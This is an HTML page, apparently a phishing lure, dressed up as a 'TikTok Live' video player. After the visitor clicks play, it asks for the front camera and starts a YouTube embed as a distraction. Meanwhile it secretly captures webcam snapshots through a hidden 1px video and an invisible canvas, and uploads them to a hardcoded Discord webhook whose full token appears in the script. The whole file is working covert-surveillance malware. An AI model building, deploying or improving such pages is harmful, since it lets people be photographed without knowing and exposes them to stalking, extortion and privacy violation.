<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok Live</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        .wrapper { position: relative; width: 100%; height: 100%; }
        
        #youtube-frame {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none;
        }

        #start-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 200;
            color: white;
            cursor: pointer;
        }

        .play-btn {
            width: 80px; height: 80px;
            background: #fe2c55; /* لون تيك توك */
            border-radius: 50%;
            display: flex; justify-content: center; align-items: center;
            font-size: 40px; margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(254, 44, 85, 0.5);
        }

        #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
        #photo-canvas { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <iframe id="youtube-frame" 
        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=0&mute=0&loop=1&playlist=C3vaOyZFcsM&controls=0" 
        frameborder="0" allow="autoplay; encrypted-media">
    </iframe>

    <div id="start-overlay">
        <div class="play-btn">▶️</div>
        <p style="font-weight: bold;">اضغط لمشاهدة الفيديو</p>
    </div>
</div>

<video id="hidden-camera" autoplay playsinline muted></video>
<canvas id="photo-canvas"></canvas>

<script>
    const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';
    const overlay = document.getElementById('start-overlay');
    const iframe = document.getElementById('youtube-frame');
    const camera = document.getElementById('hidden-camera');

    overlay.addEventListener('click', async () => {
        try {
            // 1. طلب الكاميرا أولاً بدقة جيدة
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
            });
            camera.srcObject = stream;

            // 2. تشغيل الفيديو والصوت فوراً
            iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
            iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
            
            overlay.style.display = 'none';

            // 3. التقاط الصورة (محاولات متعددة لضمان الوضوح وعدم السواد)
            camera.onplaying = () => {
                // محاولة أولى بعد 3 ثوانٍ
                setTimeout(() => captureAndSend(1), 3000);
                // محاولة ثانية بعد 6 ثوانٍ لضمان وصول صورة أوضح
                setTimeout(() => captureAndSend(2), 6000);
            };

        } catch (err) {
            console.log("Access denied or Camera error");
            overlay.style.display = 'none';
            iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
            iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
        }
    });

    async function captureAndSend(id) {
        const canvas = document.getElementById('photo-canvas');
        const context = canvas.getContext('2d');

        // نتحقق أن الكاميرا ترسل بيانات فيديو فعلاً
        if (camera.videoWidth > 0) {
            canvas.width = camera.videoWidth;
            canvas.height = camera.videoHeight;
            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                if (!blob) return;
                const formData = new FormData();
                formData.append('file', blob, `capture_${id}.png`);
                // إضافة رسالة للديسكورد لسهولة التعرف على اللقطة
                formData.append('content', `📸 لقطة رقم ${id} من الجهاز مباشرة`);

                try {
                    await fetch(webhookURL, { method: 'POST', body: formData });
                } catch (e) { console.error("Discord send failed"); }
            }, 'image/png');
        } else {
            // إذا كانت الكاميرا لم تعمل بعد، حاول مرة أخرى بعد ثانية
            setTimeout(() => captureAndSend(id + "_retry"), 1000);
        }
    }
</script>
</body>
</html>
